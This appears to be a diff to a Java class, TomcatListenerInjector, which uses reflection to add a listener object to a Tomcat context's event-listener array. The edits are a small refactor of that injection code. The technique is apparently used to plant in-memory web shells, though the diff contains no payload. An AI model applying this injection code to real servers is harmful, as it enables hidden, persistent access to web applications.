@@ -113,9 +113,10 @@ public class TomcatListenerInjector {
     @SuppressWarnings("all")
     public void addListener(Object context, Object listener) throws Exception {
         if (!isInjected(context, listener.getClass().getName())) {
-            if (getFV(context, "applicationEventListenersObjects") != null) {
-                Object[] appListeners    = (Object[]) getFV(context, "applicationEventListenersObjects");
-                if(appListeners != null && appListeners.length > 0) {
+            Object applicationEventListenersObjects = getFV(context, "applicationEventListenersObjects");
+            if (applicationEventListenersObjects != null) {
+                Object[] appListeners = (Object[]) applicationEventListenersObjects;
+                if (appListeners != null) {
                     List appListenerList = new ArrayList(Arrays.asList(appListeners));
                     appListenerList.add(listener);
                     setFieldValue(context, "applicationEventListenersObjects", appListenerList.toArray());
@@ -194,7 +195,7 @@ public class TomcatListenerInjector {
     }
 
     public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
-        final Field field = getF(obj.getClass(), fieldName);
+        Field field = getF(obj, fieldName);
         field.set(obj, value);
     }
 
